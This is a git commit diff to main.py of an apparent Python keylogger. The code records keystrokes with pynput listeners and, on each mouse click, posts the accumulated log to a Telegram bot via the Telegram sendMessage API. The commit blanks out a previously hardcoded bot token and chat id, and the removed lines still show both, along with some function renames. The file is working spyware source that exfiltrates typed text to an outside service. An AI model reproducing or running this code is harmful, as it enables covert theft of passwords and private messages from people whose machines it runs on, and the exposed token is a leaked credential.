351402e84055c1f0724fe91e3f3176eb0b1b8840
Fulanodtals <122408065+Fulanodtals@users.noreply.github.com>
2024-07-05 23:19:26 -0300

    Update main.py

--- main.py
+++ main.py
@@ -5,9 +5,10 @@ import telebot
 
 fullog = ''
 words = ''
-bot_token = '7317534517:AAGc_xjKku8_hwLmuTDrMHyoUhHZ9X-E8JY'
-chat_id = '6005215116'
-bot = telebot.TeleBot(bot_token)
+
+botToken = ''
+chatId = ''
+bot = telebot.TeleBot(botToken)
 
 def onPress(key):
     global fullog
@@ -35,11 +36,11 @@ def onPress(key):
     if key == Key.esc:
         return False
     
-def on_click(x, y, button, pressed):
+def click(x, y, button, pressed):
     global fullog
     global words
 
-    if len(words) > 0 and pressed:  # Verifica se o botão do mouse foi pressionado
+    if len(words) > 0 and pressed:
         fullog += words + '\n'
         send(fullog)
         words = ''    
@@ -49,16 +50,16 @@ def on_click(x, y, button, pressed):
 
 #@bot.message_handler(commands=["send"])
 def send(message):
-    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
+    url = f'https://api.telegram.org/bot{botToken}/sendMessage'
     payload = {
-        'chat_id': chat_id,
+        'chat_id': chatId,
         'text': message
     }
     response = requests.post(url, data=payload)
     return response.json()
 
 def main():
-    with Listener(on_press=onPress) as k_listener, mouse.Listener(on_click=on_click) as m_listener:
+    with Listener(on_press=onPress) as k_listener, mouse.Listener(on_click=click) as m_listener:
         k_listener.join()
         m_listener.join()
 
